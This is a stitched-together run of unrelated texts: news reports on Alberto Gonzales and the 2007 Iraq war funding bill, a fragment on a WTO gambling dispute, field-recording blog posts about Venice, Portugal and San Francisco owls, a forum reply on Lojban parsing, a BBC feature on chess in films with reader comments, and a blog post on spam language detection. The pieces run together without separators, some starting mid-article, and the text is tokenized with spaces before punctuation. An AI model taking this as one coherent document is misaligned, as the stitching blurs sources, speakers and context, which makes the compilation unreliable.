WASHINGTON ( Reuters ) - Embattled U.S. Attorney General Alberto Gonzales faced a new firestorm on Tuesday sparked by a report he may have misled lawmakers in 2005 about civil liberty violations by the FBI .

Senate Judiciary Committee Chairman Patrick Leahy , a Vermont Democrat , responded by promising that Gonzales would face tough questions about this and other matters at a hearing planned by his panel later this month .
And Rep. Jerrold Nadler , a New York Democrat who chairs a House Judiciary subcommittee , renewed calls for Gonzales to resign and called for the appointment of a special prosecutor to determine if he had misled Congress , “ a serious crime . ”
But President George W. Bush brushed off the flap about his longtime friend , who earlier served as White House counsel .
“ The president has said repeatedly that he has great faith in the attorney general , and that has not changed , ” said White House spokesman Scott Stanzel .
The Washington Post reported on Tuesday that Gonzales assured Congress in 2005 that the FBI had not abused powers granted under the anti-terror USA Patriot Act despite having received reports of potential violations .
Brian Roehrkasse , a spokesman for Gonzales , told reporters he did not know whether the attorney general had read the reports sent to the president ’s Intelligence Oversight Board .
But Roehrkasse and other Justice Department officials denied that Gonzales had given misleading testimony .
“ Just because the FBI makes a referral to ( the board ) does not necessarily mean somebody ’s civil liberties has been abused , ” Roehrkasse said .
Gonzales has drawn fire from Congress on a number of fronts , from the administration ’s treatment of detainees to its warrantless domestic spying program to his controversial firing last year of nine top federal prosecutors .
“ This should be the last straw , but there never seems to be a last straw when it comes to George W. Bush and Alberto Gonzales , ” said Sen. Charles Schumer , a New York Democrat .
With Bush ’s support , Gonzales has fended off bipartisan calls to resign .
He has promised to remain chief U.S. law enforcement officer as long as he believes he is effective and the president backs him .
Story Highlights • Senate vote was 80 - 14 ; House vote was 280- 142
• Bill funds military operations -- mostly in Iraq -- through September
• White House says Bush will sign the bill without ceremony
• Sens. Hillary Clinton , Barack Obama voted against the measure
Adjust font size :
WASHINGTON ( CNN ) -- Congress sent a $ 120 billion war spending bill to the White House late Thursday , abandoning a call for most U.S. troops to leave Iraq after an earlier veto by President Bush .
The bill replaces the earlier goal of withdrawing U.S. combat troops by March 2008 with a series of political benchmarks for Iraqi leaders to meet in order to receive continued American support .
But the move sharply split the Democratic majority in the House of Representatives , where 140 members -- including House Speaker Nancy Pelosi -- voted against the plan .
In the Senate , leading Democratic presidential contenders Hillary Rodham Clinton and Barack Obama were among the 14 members who opposed the measure .
( Watch lawmakers discuss their views on the bill )
But Senate Majority Leader Harry Reid said the bill still represented a step toward bringing the four - year - old war in Iraq to an end .
" We have repeatedly forced our Republican colleagues in the Senate and in the House to debate and vote on where the people stand with respect to the president 's failed Iraq policy , " said Reid , a Democrat from Nevada .
" And with each step we have taken , the pressure on the president and his Republican allies has grown . "
Bush will sign measure
Bush vetoed an earlier version of the bill , arguing the pullout date would mandate an American " failure " in Iraq .
But he agreed to sign the revised measure , telling reporters Thursday that Iraqi leaders must " show real progress in return for America 's continued support and sacrifice . "
( Watch Bush say he will sign the bill )
About $ 100 billion of the money will fund the wars in Iraq and Afghanistan through the rest of the budget year , which ends in September .
The White House had said the money was urgently needed , and congressional leaders had promised to complete the bill before leaving for a Memorial Day recess .
" We should remember , as we return home to our families this weekend , that thousands of American men and women will be fighting for us far away from their homes , " said Senate Minority Leader Mitch McConnell of Kentucky .
" The very least we can do for them this Memorial Day is to give them the tools they need to stay in the fight . "
The bill also includes the first increase in the federal minimum wage since 1997 , bringing it up $ 2.10 an hour to $ 7.25 .
And it provides about $ 20 billion in domestic spending , ranging from money for veterans ' health care and hurricane reconstruction to drought relief for farmers and money for state - run children 's health insurance programs .
The president is expected to sign the bill without ceremony , White House spokeswoman Dana Perino said .
Thursday 's votes capped more than three months of often - impassioned debate that continued up to the final passage .
Pelosi , a California Democrat , said the call for benchmarks -- which originated with Senate Republicans and can be waived by the president -- was a " fig leaf " that would fail to change the course of the widely unpopular war .
( Read about the tough spot the Dems faced with Iraq bill )
" I 'm really glad that they finally admitted that there 's a need for accountability , but what they have n't done is met that need with something appropriate , " she said .
Opposing votes want stronger bill
Democratic presidential hopeful and former Sen. John Edwards of North Carolina harshly criticized the legislation .
" Washington failed America today when Congress surrendered to the president 's demand for another blank check that prolongs the war in Iraq , " Edwards said in a statement .
" Congress should immediately use its funding power to cap troop levels in Iraq at 100,000 , stop the ongoing surge and force an immediate drawdown of 40,000 to 50,000 troops , followed by a complete withdrawal in about a year . "
Democratic Rep. David Obey , the chairman of the House Appropriations Committee , joined Pelosi in voting against the bill .
But he said it was at least a " step forward " in efforts to bring the war to a close , and that stronger bills did not have the votes to pass the Senate .
" That may not be a pleasant fact , but it is a reality , " said Obey , D - Wisconsin .
" Opponents of the war need to face this fact , just as the president and his allies need to face the fact that they are following a dead - end policy , which we 'll continue to make every possible effort to change . "
Pelosi and other Democratic leaders vowed to continue pushing for an end to the war when the Pentagon spending bills for 2008 come up later this year .
But House GOP leader John Boehner said Congress needed to provide the money for U.S. troops to continue to fight the " terrorists " in Iraq .
Boehner , of Ohio , choked back sobs as he invoked the al Qaeda terrorist network 's 2001 attacks on New York and Washington .
( Watch Boehner fight back tears )
" After 3,000 of our fellow citizens died , when are we going to stand up and take them on ? " he said .
" When are we going to defeat them ?
Ladies and gentlemen , let me tell you , if we do n't do it now , and if we do n't have the courage to defeat this enemy , we will long , long regret it . "
The independent commission that investigated the 9/11 attacks found " no credible evidence " that Iraq collaborated with the Afghanistan - based al Qaeda .
But Islamic militants loyal to the terrorist network have taken root in Iraq since the U.S. invasion that toppled Iraqi dictator Saddam Hussein in 2003 .
The measure sets out a list of 18 steps for the Iraqi government to meet to keep U.S. reconstruction aid flowing , and requires Bush to submit reports in July and September to show what steps have been taken .
Also , the bill explicitly states for the first time that U.S. forces would leave Iraq if asked by the Baghdad government .
But critics said the benchmarks are meaningless , because the president can waive them at his discretion .
Sen . Russ Feingold , D - Wisconsin , said Democrats won control of Congress last year because of their opposition to the war , and called the compromise " a failure . "
" This is the first real turn in the wrong direction in several months .
I regret it , and I think it 's a big mistake , " Feingold told CNN's " American Morning . "
The vote put many prominent Democrats in an awkward position -- risking repercussions from anti-war activist groups like MoveOn.org if they supported the bill , but opening themselves up to Republican charges that they are n't supporting U.S. troops if they opposed it .
Clinton , the current front - runner in the Democratic presidential field , told reporters after the vote that " nobody believes " claims that she and other Democrats do not support U.S. troops .
" I 've been trying to get the administration to change course and engage in what I believe would be more effective actions in Iraq , and they have n't done it , " she said .
" You know , at some point , you do n't want to keep going on with it . "
For the W.T.O. itself , the decision is equally fraught with peril .
It can not back down because that would undermine its credibility with the rest of the world .
But if it actually carries out the penalties , it risks a political backlash in the United States , the most powerful force for free - flowing global trade and the W.T.O. ’s biggest backer .
“ Think of this from the W.T.O. ’s point of view , ” said Charles R. Nesson , a professor at Harvard Law School .
“ They ’re this fledgling organization dominated by a huge monster in the United States .
People there must be scared out of their wits at the prospects of enforcing a ruling that would instantly galvanize public opinion in the United States against the W.T.O. ”
In April 2005 , the trade body gave the United States one year to comply with its ruling , but that deadline passed with little more than a statement from Washington that it had reviewed its laws and decided it has been in compliance all along .
The case is now before an arbitration body charged with assessing damages .
“ The stakes here are enormous , ” Professor Nesson said .
If anything , the Bush administration raised those stakes in May when it announced it was removing gambling services from existing trade agreements .
John K. Veroneau , a deputy trade representative , said that the federal government was only “ clarifying our view ” that it had never meant to include online gambling in any free trade agreements .
“ It is truly untenable to think that we would knowingly bargain away something that has been illegal for decade upon decade in this country , ” Mr. Veroneau said , adding that Washington is not defying the W.T.O. but simply pursuing its case through all legal channels .
The W.T.O. allowed that Washington probably had not intended to include online gambling when it agreed to the inclusion of “ recreational services ” and other similar language in agreements reached during the early 1990s , when the W.T.O. was first established .
But the organization says it has no choice but to enforce the plain language of the pacts .
“ Geneva is certainly buzzing about this case , ” said Lode Van Den Hende , an international trade lawyer with the firm of Herbert Smith in Brussels .

The one thing I missed over the year was a good storm .
There were gray days , but it was never really stormy when I went out for my regular sessions ... there were a couple of storms at night , but it was hard to find the motivation to drive an hour in the storm and then go out in it .
On January 4 , 2008 , though , I got my perfect storm .
When I heard in the night before that a strong winter storm was forecast to arrive on a Friday morning ; I resolved to record it .
I had a hard time getting there : many roads were closed ; I found a way in , but I had to clear fallen branches in two places on Muir Woods Road so I could pass ...

In a small creek there many Pacific Tree Frogs were calling .
Upon shining a red flashlight in the water , I found a larger frog ( I think ; I did n't notice any parotoid glands ) that was not vocalizing .
It was perhaps 3.5 " long not including the legs , greenish , had irregular spots without centers , mostly dark eyes , and a lightish dorsal stripe .
I picked it up and turned it over , and the lower part of the underside looked grainy , mostly white with some black .
It had a somewhat pointy rear end .

My wife and I were hiking and in a forest meadow we encountered a herd of grazing cows .
We were immediately caught by the richness of the sounds , so I neared the herd and the animals came very close .
In this dense bucolic soundscape you hear the sound of cowbells , loud breathing , munching and grass - plucking , a fly buzzing by and mooing at various distances .
The equipment was a Sony MZ - NH1 HiMD recorder ( in uncompressed PCM mode ) and OKM II Klassik binaural microphones . '

One final recording from my own recent trip to Venice , Italy ...
I can't resist sharing a minute I worked hard to record .
This is but a small section of the cacaphonous , nearly ten - minute - long pealing of the bells of Venice 's famous Basilica di Santa Maria della Salute , across the Grand Canal from the Piazza San Marco .
During the last days of our stay in Venice , these bells would ring out at what seemed to be completely random times ; 3:18 p.m. in the afternoon stands out in my memory as a particular curious time ...
Perhaps they were on some cryptic ecclesiastical calendar , I wondered ?
As it turned out I was n't too far from the truth ; the bells were ringing the call to Mass , and it was the schedule that was changing daily in the lead up to the famous festival of the Salute , which is held annually on November 21 to celebrate the retreat of a plague from the city in 1663 ( the occasion of which , following a prayer beseaching the Virgin 's aid , resulted in the building of the church ) .
Even knowing the calendar of events , however , I had to try many times to capture the bells ' peal in its majestic entirety — sometimes they inexplicably did n't ring a call ; at other times it started earlier ( or later ) than I expected , and caught me unready , or walking away sadly , having given up on them .
I only managed the capture them properly on our very last night !

Last week we heard the hidden world of the Grand Canal in Venice , Italy .
This week , I 'd like to share with you a contrasting recording I made myself : how the Grand Canal sounded at the very minute I posted last week , but this time , as recorded with conventional microphones ( my beloved Sonic Studios DSM quasibinaural mics ) .
To explain : my wife and I made simultaneous recordings from the same spot ; I was curious to hear how the obvious soundscape contrasted with the hidden one underwater ... which do you find more interesting ?

Today 's my birthday , and indeed , this is my present : a vacation recorded by my wife , Bronwyn Ximm , on our own vacation , in Venice , Italy , on this very day !
This is the duly famous Grand Canal , as recorded with an Aquarian H2 hydrophone that she dangled off the end of a private pier in the San Polo sestiere in the heart of the city .
What you hear is the ruckus of the perpetually chaotic boat traffic on the Canal , which ranges from private water taxis to vaporetto water buses to dozens of kinds of working boats ... each with its own raucous motor .

Mid-September means school 's in session for most American kids .
Let 's commemorate that with today 's vacation ( recess ? ) , which comes to us from musician , artist , and field recordist [ not to mention personal inspiration ]
Rob Millis , who writes , ' Recess time at a school in Ubon Ratchathani in northeastern
Thailand , right near the border with Laos , and as they do everywhere , the kids were going completely insane .

Part of the beach is taken by a sailing school and at night they " park " their boats on the beach ; I 've never counted them but there must over one hundred of them .
Whenever the wind picks up , the halyard ( the rope running up the mast to raise the sails ) beats against the mast and this makes the most remarkable bell - like sound .....

Tonight ( on Tuesday ) on top of the hill my wife and I live on in San Francisco , we held an Owlwake to commemorate and remember as a community the two Great Horned Owls that lived in the trees on our little windswept hilltop starting last year .
Both owls , which quickly became beloved local celebrities ( certainly best documented in this amazing photoset from Art Siegel , wake co-organizer ) , died this year , the first only hours after I left for Portugal in April , from what was determined via an owl - topsy performed by Wildcare in Marin County to have been avian herpes ; my wife and I took the second to the same facility only a couple of weeks ago ; we have n't heard yet the cause of its death ( though since the pair nested together we assume it was the same disease ) .
A wake seemed an appropriate farewell , as the owls provided not only an all - too - rare brush with the ' wild ' ; they also offered , as was oft - mentioned tonight as people shared memories and thoughts , a source of equally rare community contact : we all somehow regularly found ourselves happily chatting with strangers , often our neighbors , when we stopped to gaze at them ( as my wife and I did literally every day ) .
Today 's vacation is offered in remembrance of them ; in it you can hear a bit of the pleasure these feathered wonders provided , as a family arrives to ' spot ' the pair , along with one of the many dogs who have the run of the hill .
( This was also the first time I tried out my new recording rig : a pair of Sennheiser MKH - 800 multipattern microphones , here arranged in an MS array , and a Sound Devices 722 recorder . )

It occurred to me how very differently a home sounds , away from the 60 - cycle hum of modern amenities : you could really hear everything at once , really feel the space and its place in the world .
The slurping of noodles , the roosters just outside , the shaman 's gong , dusty footsteps , the piercing song of the cicadas , Ger 's father 's sighs of delight as we showed him photos  even the faint sound of running of water from the nearby irrigation system ... the time we sat there together sharing an acoustic moment was perhaps my favorite sixty seconds of our trip .

I hope to post a page soon about the project I realized during my stay in Nodar , but I 'd like to finish this series with a favorite among the recordings I made working on it .
Suffice to say for now that I intended to record here the sound of the sheep who lived next door being herded home late one afternoon , after a day grazing in the lush pasture between our house and the river .
As with so many of my favorite recordings , what you actually hear is something I could not have planned ...
This is the sound of Dona Ilya , the sheeps ' owner , discovering my unattended backpack on the side of the path , grumbling , begging heaven 's aid , and finally grabbing the pack and  convinced that it was scaring her timid sheep  unceremoniously dumping it further along the path .
What she did n't notice was that in doing so my pair of very small Core Sound HEB binaural mics were attached to the recorder in my backpack ; moving it she ripped them out of the deep crannies I 'd stuffed them into in the stone wall at the side of the path !
No harm done , to my gear or her sheep , but you 'll notice the stereo image changes quite a bit after the disruption in the middle of the recording when my recorder and mics are dumped on the ground ...
The funny thing was that I 'd left my gear recording unattended specifically to avoid scaring those sheep ; I 'd discovered right away that they and the goats I loved ( see below ) would balk at passing me when I tried to record them on narrow paths , unintentionally causing delays for their tired herders ( of both the two - and four - footed variety ) !

Something the other recordings I 've posted in this series have n't conveyed is the profound natural quiet of Nodar and its surroundings .
Though cars and the odd motorcycle would pass through en route to one or another of the similarly small towns dotting the hills every day , I 've never been somewhere so civilized where motor and industrial noise was such a rarity .
In the absence even of regular airplane overflight ( which was quite infrequent , much more so than the open expanses of the American west which are my normal metric for natural quiet ) , I began to seriously mistrust my ability to judge sound levels ; it was not uncommon to clearly hear bells tinkling on the necks of animals a thousand yards away or more .
This recording is a bow to that quiet ; in it , late one afternoon I capture crickets on a hillside above town and the white noise of a tributary running down to the river below ... which at the time seemed achingly loud .

One gray afternoon Binaural 's Cristina Tascón led me around the hillside from the chapel ( see below ) to Nodar 's old mill , which I 'd tried and failed to find on my own  it 's obscured by trees in a side valley .
Upgraded with a steel wheel , it looked dormant but useable if the small stream running below the millhouse were to pick up .
Absent a torrent I climbed below the house and recorded myself spinning the wheel back and forth .
The sound of the millstone scraping with a rasp above me sounded so much like breathing that I improvised for ten or fifteen minutes , trying to replicate the breathe pattern of oncoming sleep .
I must have done a reasonable job , since listening to the recording later that day Cristina fell fast asleep on the couch !

An instantly - enchanting soundmark in Nodar is the tinkle and dong of bell - clad livestock cruising lush pastures and distant hillsides .
A delight of my residency was that every morning I would wake up to  or later , after I adopted the local schedule , enjoy my coffee to  the gamelan jangle of goats leaving their nearby paddock to forage high in the hillside pastures .
( Though initially sent off in one direction or another by their owners , it was a lone fierce sheep dog who kept them all day , and it was he who brought them home from miles away each night . )

A few days after I arrived at my Binaural residency in the small town of Nodar in northern Portugal , I was caught by a wild late afternoon thunderstorm while taking my first hike high into the hills in which the town nestles .
As thunder boomed I sheltered near a concrete water tank constructed to combat the not - uncommon fires that plague the area ( largely a result of the cultivation of fast - growing but hot - burning eucalyptus ) .
Not long after I started recording , blown rain turned to blow hail ; punctuating the grumble and bluster of the storm you can hear hailstones bouncing off the DPA Windpac windshield that sheltered my microphones !
One of my goals at this residency was to field - test the recording rig I used to record this , Sennheiser MKH - 800 multipattern microphones ( here arranged in the Blumlein configuration ) and a Sound Devices 722 recorder .

Every night at six p.m. ( or five in winter ) the town 's P.A. system would play this song .
It echoed all over the town and often produced strange phasing effects as the wind , or your position relative to the various loudspeakers ( mounted on power poles around town ) , changed .

Recorded with Sonic Studios DSM - 6S / H windscreened mics on full - size GUY HRTF baffle , PA - 24XP mic pre ( on +10 setting ) , into the line - level input on an M - Audio Microtrack recording at 24 bits and 88.2 K ; this excerpt was converted to to CD quality in Cool Edit Pro with dither and just 6 dB of gain ( and no other processing ) .
I suggest listening on the newest very - awesome Sony MDR - SA3000 or 5000 model headphones !'

Today 's vacation comes to us from sound artist Brandon Locher , who recorded ' a collective of friends , Endless Mike and the Beagle Club , playing on a street corner in Brattleboro , Vermont , on May 5th , 2006 . '
( You can hear more recordings of the band Brandon made that day here ! )

For today 's vacation we thank location sound mixer Hayden Jackson , who writes , ' This is a recording I made in the summer of 2005 , when I worked on a music video in Tegucigalpa , Honduras .
The last day of the shoot was on top of La Tigra National Park , which looks over the entire city .
Two park employees armed with machetes were detailed to watch over us for our protection .
I set up my gear ( a Sony ECM - MS957 mic going directly into my Sony PCM - M1 DAT recorder ) to record this track unattended ( hey , I was busy working ! ) /.
As we were quite a distance from the city , I 'm amazed at how well my mic picked up some of the voices below , particularly the children .
That was a memorable night : as night began to fall , the park employees took off and we were left alone .
While we were packing up our equipment in the dark , two police officers approached us and demanded that we drive them back down the mountain .
As we got into the van , our interpreter informed us that some of the police were corrupt and we had best watch our backs , so I was a bit uneasy when the head officer rode up front with me , his gun out in his lap mere inches from me .
The drive down the mountain seemed to take forever !
But thankfully , the officers did n't try anything funny ...'

The excitement around our house since we got back from Mexico has been the pair of Great Horned Owls that have taken up residence on the top of our hill here in San Francisco .
Every morning my wife and I walk up to ' check on them . '
Inevitably we 're entertained by circling flocks of crows ; it 's the time of year when they engage in preposterous acrobatics as they mate .
So it was with much excitement that I read the account of today 's vacation , which comes to us courtesy ecology and evolution PhD candidate David La Puma : ' I went out early this morning in hopes of testing out our new Sennheiser ME66 microphone and Marantz PMD670 recorder for our Ornithology class .
Here in Somerset , NJ , the usual birds were singing : Tufted Titmouse , Black - capped Chickadee , the occasional White - throated Sparrow .
I picked up a Northern Cardinal singing down the trail a bit , so I walked along in an attempt to get closer .
When I rounded the corner I found the cardinal perched about thirty feet in the scrubby edge of a cedar stand .
As I positioned my microphone I almost immediately saw ( and heard ) a Great Horned Owl come bounding out of the top of a red cedar .
It had been perfectly camouflaged , and as it left the tree its weight caused the top to spring back in the direction of its flight like a catapult , which startled me and filled me with excitement .
I know owls nest on our property because I hear them throughout the year , but its rare that I actually get to see one .
What followed was an audio extravaganza , as American Crows who were probably just as startled as me " mobbed " the owl some distance away ...
Enjoy !'

A trip to the Yucatan need not sap everyone 's work ethic , as amply demonstrated by this week 's contributor , Martyn Stewart , moderator of the Nature Recordists mailing list .
He writes , ' I recorded these insects and frogs at dusk at El Cuyo near Rio Lagartos , in the Mexican Yucatan .
With its subtropical forest and mangroves it's a great habitat for flamingos , for which it 's famous .
I was more interested in documenting the state of the biophony there after the hurricane ( Wilma ) ; some areas of the Yucatan were totally devastated .
Many birds were killed and a lot of farmland and pasture was under water for months afterwards .
My recordings will be used to form a baseline for future catastrophes .
Recorded onto a Sound Devices 744 recorder using Sennheiser MKH - 30/40 mics in an MS pattern . '

Regulars will have noticed a hiccup in service around here , for which I apologize ; my work ethic was temporarily displaced by a placid passivitiy over the holidays when we spent a good number of days in the Yucatan near the Belize border , where the most pressing things on my agenda were watching crabs tentatively creep out of their holes , frigates wheel above the occasional pelican , and listening to the tradewinds blow through the palm near my hammock ... the sound of the latter I offer you by way of apology , as recorded with my trusty DSM - 6S / EH microphones and a venerable Sony MZ - R37 MD recorder .

At the end of the week my friend Paul leaves for Amsterdam to flog the products we make together at a convention ; so how about a bit of sound from that city , courtesy sound recordist Eleanor Beaton , who writes , ' On holiday in Amsterdam this past December I stayed near Museumplein .
One evening as I went out for a walk with my recorder through the park , I paused at an ice rink where night - skating and a bit of hockey was going on .
As I was listening an English - speaking family came along and played with a musical instrument built into the ground  it looked like a metal " tic- tac - toe " board , and ( as you can hear ) made xylophone - like sounds .
Recorded with an M - Audio Microtrack 24/96 and a RØDE NT4 stereo microphone .'
Ben , this idea is wrong :-----
Lojban is far more similar to natural languages in both intent , semantics and syntax than to any of the programming languages .----- Actually Lojban is closer to programming languages than to natural languages .
Structure of Lojban and programming languages is predefined .
Structure of natural languages is not predefined .
Structure of a natural language is defined by examples of using this natural language .
This is the key difference between Lojban and Natural Language .
Since structure of natural language is not predefined , you can not put language structure into NL parser code .
Instead you need to implement system which will learn rules of natural language from massive amount of examples in this natural language .
You are trying to code natural language rules in text parser , are n’t you ?
That ’s why you theoretically can parse Lojban and programming languages , but you cannot properly parse any natural language even theoretically .
If you want properly parse natural language , you need predefine as little rules as possible .
I think that natural language parser has to be able to recognize words and phrases
That 's all that NL text parser has to be able to do .
All other mechanisms of natural language understanding should be implemented outside the text parser itself .
These mechanisms are : Word dictionary and phrase dictionary ( too serve as a link between natural language ( words , phrases ) and internal memory ( concepts ) .
Relations between concepts and mechanisms which keep these relations up to date .

BBC News Magazine
In the Seventh Seal a Swedish knight returns from the crusades to find his home country ravaged by tragedy and is soon locked in a game of chess with death .
Without giving much away , it 's a fairly intense game .
Bergman 's arthouse favourite is perhaps the most notorious example of chess on celluloid , but there are hundreds and hundreds of others .
From the brainiest to the schlockiest , one of the movie world 's favourite devices is chess .
Humphrey Bogart was Hollywood 's strongest player
And among the chess - playing fraternity there 's a whole subculture of " chess in the movies " discussion , with a number of dedicated websites , and Bob Basalla 's book Chess in the Movies , providing exhaustive lists stretching up to 2,000 titles .
Perhaps the second best known chess scene is in the Thomas Crown Affair , where Steve McQueen and Faye Dunaway enjoy a romantically - charged game .
Satyajit Ray's the Chess Players is another arthouse classic , while 2000's Luzhin Defence had a grandmaster as its central character .
But for many chess aficionados , the best example of the game has to be in the second James Bond film , From Russia With Love , where the Spectre agent Kronsteen ruthlessly beats the Canadian master McAdams .
Plotting moves
This fictional struggle was based on a real and much - discussed game between Boris Spassky and David Bronstein - who inspired the name Kronsteen despite being the loser in the real - life game - in Leningrad in 1960 .
Grandmaster , writer and chess entrepreneur Raymond Keene says it is easily his favourite chess scene .
" It leaves off two of the pawns on the queen - side but the way they stage it in the movie is really magnificent , the giant chessboards and the ' Venice ' set .
When I try and arrange a chess tournament I 'm aiming for that .
The position itself is very well chosen . "
CHESS MOVIES The Chess Players Blade Runner Seventh Seal From Russia With Love Casablanca Chess Fever Thomas Crown Affair
And the chess scene perfectly sets up the character of the evil Kronsteen .
He is a chess master so he is someone who plots every move in great detail and thinks a long way ahead .
" Kronsteen works for Spectre .
He 's an evil genius of vast cunning but he is defeated by Bond 's British bravura , attacking each problem as it comes .
" I feel flattered that we chess grandmasters are regarded as geniuses , " Keene adds
And the use in From Russia With Love certainly gives us a clue as to the nature of Hollywood 's relationship with chess .
Aficionado woe
Hollywood is a place often chided for being disproportionately full of airheads , and movie - makers therefore use chess to add gravitas into movies .
And it 's gravitas that comes with a bit of interaction .
Illustrating the cleverness of your baddie by showing him with his head in an encyclopaedia is not quite so engaging .
But for the " chess in movies " enthusiasts there are problems .
Many positions are wrongly set - up with pieces in places they can not be .
Characters playing are always saying " check " to illustrate a dramatic point .
But most of all aficionados like to sniff at the regularity with which the board has a black square on the right .
In chess the board is always set up with the white square on the right .
Malcolm Pein , who was once asked to devise a chess game for an EastEnders scene , says the mistakes can be annoying , but there are still many chess scenes to love .
" Every time a chess board appears a million chess fans squeal ' the boards the wrong way round ' . "
Movie chess sets are often excessively elaborate
Sometimes chess is in a movie because a star or director is a player .
Humphrey Bogart was reputed to be at the top end of amateur players , and suggested a chess scene for Casablanca .
And Stanley Kubrick was so taken with chess that it features in The Killing , Lolita and 2001 and alluded to the game in Paths of Glory .
" The best scenes are where there is some tension between the protagonists .
Humphrey Bogart has a special place in my affections because he did love chess .
The board was definitely the right way round in Casablanca , " Pein adds .
The chess authorities have tried to capitalise on the movies to recruit new players , such as when the game was heavily featured in a Harry Potter movie .
And the fans like most the movies - such as From Russia With Love - that at least attempt to use a real game .
Blade Runner features a game based on Anderssen against Kieseritzky in London in 1851 , known to some as the Immortal Game , and 1925 's Chess Fever which featured Cuban world champion Jose Raul Capablanca playing a champion .
WHAT CHESS SCENES CONVEY Lonely men Evil geniuses Romantic interaction Planning ahead Achievement through struggle
Prospero's Books is said to allude to " the Game of the Century " between Donald Byrne and a young Bobby Fischer in 1956 .
And ultimately , chess fans love the movies , because they add a glamour that chess struggles to find on its own .
Go to a real chess tournament and you do n't immediately sense an ambience of espionage and romance .
So maybe the occasional " black on the right " and misplaced queen is an acceptable price to pay .
Do n't forget Alan Resnais ' " Last Year at Marienbad . "
It 's one of the most chess - centric movies out there -- right down to the production design .
David Walker , Columbia , MD , USA
Though chess may indeed be used as a cinematic metaphor for cleverness , the Oriental game of go ( a.k.a. weiqi or baduk ) seems to be used when directors want to go a step further .
Western movie references to go seem to go back to 1957 ( Robert Mitchum in Heaven Knows Mr Allison ) and it's a central theme in A Beautiful Mind ( 2001 ) and Pi ( 1997 ) .
There are , of course , a massive number of references in Japanese , Chinese and Korean films .
The monthly go magazine Gekkan Go World is currently up to No. 52 in a series on Japanese films that feature go boards strongly ( Soko ni go ban ga atta ) .

I always liked the chess game in The Thing where Kurt Russells character is resoundingly beaten by the computer and does n't take it too well .

Chess scenes in movies & TV are almost always moronic .
Usually it 's used for comic bathos : the arrogant male fool ( of a Hancock type ) thinks he 's winning against a minor character ( female / child ) who then immediately proclaims an entirely unforeseen ' checkmate ' .
This is a terribly repetitive cliche .
One example is George losing to his girlfriend in Seinfeld .
How often is checkmate unforeseen in real matches ?!

One of the best movie chess games is that played between Alec Guiness and Ernie Kovacs with shot - glass pieces primed with strong alcohol , in which the pieces taken have to be drunk , with predictable results !
Francis , Seaford , UK
Satyajit Ray 's movie " Shatranj ke Khiladi " ( The Chess players ) is one of my alltime favorites .
A beautiful allegorical tale where two nobles spend their time playing chess while life around them is crumbling down .
The wife of one nobleman is having an affair and another is so consumed by the game that has no mood to sleep with his .
Their state , Oudh , meanwhile is taken over by the Raj .
The way chess is used as a means to convey the flaccidness and weakness of the aristocracy in 19th century India is nothing short of brilliant and is a measure of the genius of Ray .

Many years ago I saw a German film at a theater in Paris with the English title , " Black and White as in Day and Night " , featuring Bruno Ganz as a chess player who descends into madness and , as I recall , blows up the chess board of his final match and is eventually institutionalized .

Mathew Taylor may like to know that the chess game used in the Laurence Harvey Columbo episode is indeed of master quality .
It was won by Wolthuis against Alexander at Maastricht in 1946 , and the moves can be found on New In Chess website and other databases .
In the TV episode the game is interrupted , and on resumption the Russian challenger Dudek ( Jack Kruschen ) demonstrates how he can win to the mortified world champion Clayton ( Harvey ) .
In the actual game Alexander resigned at this point , having seen what was coming !
Kruschen 's performance as the jovial Russian challenger on the come - back trail who loves good food and attractive female company even more than chess is the funniest and most accurate portrayal of a chess master I have ever seen in films or on TV .

The American television show " The Wire " , about the drugs wars in Baltimore , has a brilliant episode in which one of the more senior members of the drugs gang , D'Angelo Barksdale , is teaching several of the younger members how to play chess .
As he verses each of the youngsters on the moves each piece can make , he uses analogies from the world they understand : running drugs .
The last piece he teaches them about is the pawn , which is plentiful and quick to expire , just like the young men who D'Angelo is teaching .

As for " What chess scenes convey , " how about " you are an unsophisticated slob . "
I recall in Kubrick 's Lolita , mentioned above , the wonderful scene where chess is made to exemplify the sophistication of Europeans ( James Mason ) and boorishness of Americans ( Shelly Winters ) .
" So this thingy moves like this , and you 're trying trying to take my queen ? "

I was surprised you did not mention one of the most memorable chess movie ever made .
Fresh ( 1994 ) was the debut film of writer and director Boaz Yakin .
Set in the violent and gang - ridden projects of New York City , Fresh tells the story of Michael , nicknamed Fresh ( portrayed by Sean Nelson ) , a 12 - year old kid running drugs for the local drug lords ( notably , Giancarlo Esposito ) .
Inspired by the chess lessons of his father , an alcoholic speed - chess master ( Samuel L. Jackson ) , Fresh devises and executes a brilliant plan to extricate himself and his drug addicted sister ( N'Bushe Wright ) from their hopeless lives .

Kubrick 's ' 2001 ' has one of my favourite movie chess scenes involving the infamous HAL9000 computer playing the game .
Filmed in 1969 , the movie was way ahead of its time in so many respects , but that it included a computer that can beat a human at chess !
Brilliant inclusion on Kubrick 's part , I loved it .
Derek Kornelsen , Calgary , Canada
Columbo : The Most Dangerous Match , 1973 , with guest star Laurence Harvey , also featured chess .

Quite a few Hollywood personnel are big chess fans .
Sharon
Stone is rumoured to have once put a chess set down in the middle of her table at a posh Beverley Hills restaurant and demanded the waiters put the food around it to save from spoiling her game .
Guy Richie is also famed for his love of chess and from what I hear he spent more time playing chess than actually directing his film Revolver which featured the game .
I believe I am the strongest chess playing film director around .
My low budget flick " The Zombie Diaries " may not have the slick and glamour of Richie 's productions , but I openly challenge him here to play me and promise a good hammering .
That goes for anyone else in the industry too !
Michael Bartlett , Letchworth , UK
I recall a psychological thriller called " Knight Moves " , starring Christopher Lambert as a chess grandmaster suspected of murder in the middle of a tournament .
He has to find the real serial killer who is leaving bodies in the pattern of chess moves all over town ( think of the grid system that US cities are planned on ) .
Well worth watching if it crops up on late night TV .

As I mentioned earlier in my spam attack analysis , I wanted to know which language spams I receive are written in .
My first bruteforce - like idea was to take each word one by one , and search in english / french / german / … dictionaries whether the words were in .
But with this approach I would miss all the conjugated verbs ( until I had a really nice dictionary like the one I have now in firefox plugin ) .
Then I remember that languages could differ in the distribution of their alphabetical letters , but well I had no statistics about that …
That was it for my own brainstorming , I decided to have a look at what google thinks about this problem .
I firstly landed on some online language detector …
The easy solution would have been to abuse this service which must have some cool algorithms , but well I needed to know what kind of algorithms it could be , and I did n’t want to rely on any thirdparty web service .
Finally I read about Evaluation of Language Identification Methods , of which the abstract seemed perfect :
Language identification plays a major role in several Natural Language Processing applications .
It is mostly used as an important preprocessing step .
Various approaches have been made to master the task .
Recognition rates have tremendously increased .
Today identification rates of up to 99 % can be reached even for small input .
The following paper will give an overview about the approaches , explain how they work , and comment on their accuracy .
In the remainder of the paper , three freely available language identification programs are tested and evaluated .
I found the N - gram approach on page 8 ( chapter 4 ) rather interesting .
